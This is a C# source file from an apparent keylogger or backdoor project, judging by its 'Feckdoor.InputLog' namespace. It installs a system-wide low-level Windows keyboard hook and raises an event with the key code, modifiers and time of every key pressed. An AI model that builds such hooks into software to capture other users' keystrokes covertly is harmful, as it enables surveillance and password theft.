using Serilog;
using System.Diagnostics;

namespace Feckdoor.InputLog
{
	public static class KeyboardHook
	{
		public static IntPtr HookHandle
		{
			get; private set;
		} = IntPtr.Zero;

		public static event EventHandler<KeyboardInputEventArgs>? OnKeyboardInput;

		/// <summary>
		/// To prevent callback from being garbage collected
		/// </summary>

		private readonly static User32.LowLevelKeyboardProc MyCallback = KeyboardHookProc;

		public static void InstallHook()
		{
			using var process = Process.GetCurrentProcess();
			using ProcessModule? module = process.MainModule;
			if (module != null)
				HookHandle = User32.SetWindowsHookEx(User32.WH_KEYBOARD_LL, MyCallback, module.BaseAddress, 0);
			else
				Log.Warning("Hook not installed: Main module of current process unavailable.");
		}

		private static IntPtr KeyboardHookProc(int nCode, IntPtr wParam, ref User32.KBDLLHOOKSTRUCT lParam)
		{
			if (nCode >= 0 && wParam == (IntPtr)User32.WM_KEYDOWN)
			{
				try
				{
					ModifierKey modifier = MkHelper.GetActiveModifierKeys();
					if (lParam.flags.HasFlag(User32.LLKHF.ALTDOWN))
						modifier |= ModifierKey.Alt;

					OnKeyboardInput?.Invoke(null, new KeyboardInputEventArgs(lParam.vkCode, lParam.scanCode, modifier, lParam.time));
				}
				catch (Exception e)
				{
					Log.Fatal(e, "Exception on keyboard hook event.");
				}
			}

			// Keep running the hook chain
			return User32.CallNextHookEx(HookHandle, nCode, wParam, ref lParam);
		}

		public static void UninstallHook()
		{
			User32.UnhookWindowsHookEx(HookHandle);
		}
	}

	public class KeyboardInputEventArgs : EventArgs
	{
		public uint VkCode
		{
			get;
		}

		public VirtualKey VkCodeEnum
		{
			get => (VirtualKey)VkCode;
		}

		public uint ScanCode
		{
			get;
		}

		public ModifierKey Modifier
		{
			get;
		}

		public uint Time
		{
			get;
		}

		public KeyboardInputEventArgs(uint vkCode, uint scanCode, ModifierKey modifiers, uint time)
		{
			this.VkCode = vkCode;
			ScanCode = scanCode;
			Modifier = modifiers;
			Time = time;
		}
	}
}
